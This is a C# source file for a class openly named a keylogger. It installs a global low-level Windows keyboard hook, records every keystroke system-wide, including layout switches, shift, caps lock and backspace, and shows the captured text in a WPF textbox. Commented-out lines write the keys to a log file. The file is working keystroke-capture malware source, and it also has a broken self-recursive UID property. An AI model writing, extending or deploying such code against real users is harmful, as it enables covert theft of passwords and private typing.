using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Windows.Forms;
using System.Threading;
using System.Globalization;

namespace KeyLogger.Core
{
    class LoggerMain : IKeyLogger
    {
        public static System.Windows.Controls.TextBox txtBox;
        //Installs a hook procedure that monitors low-level keyboard input events.
        private const int WH_KEYBOARD_LL = 13;
        //Posted to the window with the keyboard focus when a nonsystem key is pressed.
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYUP = 0x0105;
        private const int WM_SYSKEYDOWN = 0x0104;
        public const int KF_REPEAT = 0x40000000;
        //KEYS
        private const int VK_SHIFT = 0x10;
        private const int VK_CONTROL = 0x11;
        private const int VK_MENU = 0x12;
        private const int VK_CAPITAL = 0x14;
        //Delegate to the function which we need to save our keys.
        //The system calls this function every time a new keyboard input event is about to be posted into a thread input queue.
        private static LowLevelKeyboardProc _proc = HookCallback;
        //If the function succeeds(SetWindowsHookEx), the return value is the handle to the hook procedure.
        private static IntPtr _hookID = IntPtr.Zero;
        //Current language
        private static CultureInfo ci;
        //SHIFT and CAPS State
        private static bool shiftState = false;
        private static bool capsState = false;
        //Backspace counter
        private static int backCount = 0;
        //Loged Char
        private static string charLoged;

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);
        public string UID
        {
            set { }
            get { return UID; }
        }
        public LoggerMain(string UID, System.Windows.Controls.TextBox box)
        {
            this.UID = UID;
            txtBox = box;
        }
        public void Start()
        {
            ushort lang = GetKeyboardLayout();
            ci = new CultureInfo(lang);
            System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "\n" + ci.ThreeLetterISOLanguageName + "\t"));
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        public void Loging()
        {

        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            //Gets a new Process component and associates it with the currently active process.
            using (Process curProcess = Process.GetCurrentProcess())
            //Gets the main module for the associated process.
            using (ProcessModule curModule = curProcess.MainModule)
            {
                //return value is the handle to the hook procedure
                //GetModuleHandle - This function returns a module handle for the specified module if the file is mapped into the address space of the calling process.
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(
            int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                KeysConverter kc = new KeysConverter();
                
                string tempstring = kc.ConvertToString(vkCode);
                var buf = new StringBuilder(256);
                var keyboardState = new byte[256];
                if ((shiftState == false && capsState == false) || (shiftState == true && capsState == true))
                {

                }
                else
                {
                    keyboardState[(int)Keys.ShiftKey] = 0xFF;
                }
                ToUnicodeEx((uint)vkCode, MapVirtualKey((uint)vkCode, 0), keyboardState, buf, 255, 0, (IntPtr)GetKeyboardLayout());
                charLoged = buf.ToString();

                //if ((shiftState == false && capsState == false) || (shiftState == true && capsState == true))
                //{
                //    tempstring = tempstring.ToLower();
                //}
                //else
                //{
                    
                //}
                ushort lang = GetKeyboardLayout();
                CultureInfo ciTemp = new CultureInfo(lang);
                if (ciTemp.Name == ci.Name)
                {

                }
                else
                {
                    System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "\n" + ciTemp.ThreeLetterISOLanguageName + "\t"));
                    ci = ciTemp;
                }
                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    if ((Keys.LShiftKey == (Keys)vkCode || Keys.LControlKey == (Keys)vkCode) || (Keys.Space == (Keys)vkCode || Keys.Capital == (Keys)vkCode ) || Keys.Back == (Keys)vkCode)
                    {
                        if (Keys.LShiftKey == (Keys)vkCode) {
                            shiftState = true;
                            //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_Shift_"));
                        }
                        if (Keys.RShiftKey == (Keys)vkCode)
                        {
                            shiftState = true;
                            //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_Shift_"));
                        }
                        if (Keys.LControlKey == (Keys)vkCode) { /*System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_Ctrl_"));*/ charLoged = "_Ctrl_"; }
                        if (Keys.Space == (Keys)vkCode) { /*System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += " "));*/ charLoged = " "; }
                        if (Keys.Capital == (Keys)vkCode) {
                            if (capsState == true)
                            {
                                //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_CapsOf_"));
                                capsState = false;
                            }
                            else
                            {
                                //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_CapsOn_"));
                                capsState = true;
                            }

                        }
                        if(Keys.Back == (Keys)(vkCode)) {
                            backCount++;
                            if (backCount > 1)
                            {
                                System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text = txtBox.Text.Remove(txtBox.Text.Length - 7 - backCount.ToString().Length, 7 + backCount.ToString().Length)));
                            }
                            else
                            {
                                System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "____"));
                            }
                            //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_BACK+" + backCount +"_"));
                            charLoged = "_BACK+" + backCount + "_";
                        }
                        else
                        {
                            backCount = 0;

                        }
                        System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += charLoged));

                    }
                    else
                    {
                        //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += tempstring));
                        System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += charLoged));
                        backCount = 0;
                        return CallNextHookEx(_hookID, nCode, wParam, lParam);

                    }
                }
                if (wParam == (IntPtr)WM_KEYUP)
                {
                    if(Keys.LControlKey == (Keys)vkCode) { /*System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_ctrlUp_"));*/
                        charLoged = "_ctrlUp_";
                        System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += charLoged));
                    }
                    if(Keys.LShiftKey == (Keys)vkCode) {
                        shiftState = false;
                        //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_shiftUp_"));
                    }
                    if (Keys.RShiftKey == (Keys)vkCode)
                    {
                        shiftState = false;
                        //System.Windows.Application.Current.Dispatcher.BeginInvoke(new Action(() => txtBox.Text += "_shiftUp_"));
                    }
                }
                //Console.WriteLine((Keys)vkCode);
                //StreamWriter sw = new StreamWriter(@"C:\abc" + @"\log.txt", true);
                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                //sw.Write((Keys)vkCode);
                //sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static ushort GetKeyboardLayout()
        {
            return (ushort)GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(),
                                                                      IntPtr.Zero));
        }

        // IMPORTING FUNCTION FROM DLL
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(int idThread);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint virtualKeyCode, uint scanCode, byte[] keyboardState, [Out, MarshalAs(UnmanagedType.LPWStr, SizeParamIndex = 4)] StringBuilder receivingBuffer, int bufferSize, uint flags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(
        uint uCode,
        uint uMapType);
    }
}
